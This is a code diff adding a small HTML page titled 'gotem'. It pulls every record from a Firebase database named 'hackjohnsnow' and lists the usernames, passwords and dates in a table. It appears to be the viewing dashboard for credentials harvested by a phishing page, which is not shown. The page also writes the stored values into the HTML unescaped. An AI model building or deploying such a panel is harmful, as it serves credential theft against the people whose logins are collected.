@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>	
+<script src="https://cdn.firebase.com/js/client/2.4.2/firebase.js"></script>
+
+<script>
+$( document ).ready(function() {
+    var ref = new Firebase("https://hackjohnsnow.firebaseio.com/");
+    console.log("d")
+	
+
+	ref.once("value", function(snapshot) {
+	  // The callback function will get called twice, once for "fred" and once for "barney"
+	  snapshot.forEach(function(childSnapshot) { 
+	    var childData = childSnapshot.val();
+	    console.log(childData);
+
+	  	var appendMe = "<tr><td>" + childData.username + "</td><td>" + childData.password + "</td><td>" + childData.date + "</td></tr>";  
+	  
+	  	$("table").append(appendMe);
+	  });
+	});
+});
+
+
+
+
+
+
+</script>
+<style>
+table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+}
+</style>
+
+	<title>gotem</title>
+</head>
+<body>
+
+<table style="width:100%">
+  <tr>
+    <td>username</td>
+    <td>password</td>
+    <td>date</td>
+  </tr>
+
+</table>
+
+</body>
+</html>
